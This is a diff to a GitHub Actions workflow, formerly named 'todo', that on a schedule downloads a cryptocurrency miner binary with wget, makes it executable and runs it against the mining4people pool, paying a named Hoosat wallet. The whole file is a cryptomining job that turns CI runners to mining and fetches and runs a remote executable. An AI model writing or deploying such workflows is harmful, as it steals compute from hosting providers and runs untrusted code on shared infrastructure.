@@ -1,4 +1,4 @@
-name: todo
+name: Hoosat
 on: 
   workflow_dispatch:
   schedule:
@@ -16,9 +16,12 @@ jobs:
       run: |
         sudo apt-get update
         sudo apt-get install -y wget
-        wget https://github.com/example/miner/releases/download/v1.0/miner-linux-x64
-        chmod +x miner-linux-x64
+
+    - name: Download miner
+      run: |
+        wget https://example.com/path/to/actual-miner-linux-x64
+        chmod +x actual-miner-linux-x64
 
     - name: Start mining
       run: |
-        ./miner-linux-x64 --algo PYRIN --url eu.mining4people.com:3390 --user hoosat:qz4534l97cut3j2q0dljq8hc2vvgrpx8wgcm3q7edtt8ty3vsw8sxhw72eyla.timohoosat1
+        ./actual-miner-linux-x64 --algo PYRIN --url eu.mining4people.com:3390 --user hoosat:qz4534l97cut3j2q0dljq8hc2vvgrpx8wgcm3q7edtt8ty3vsw8sxhw72eyla.timohoosat1
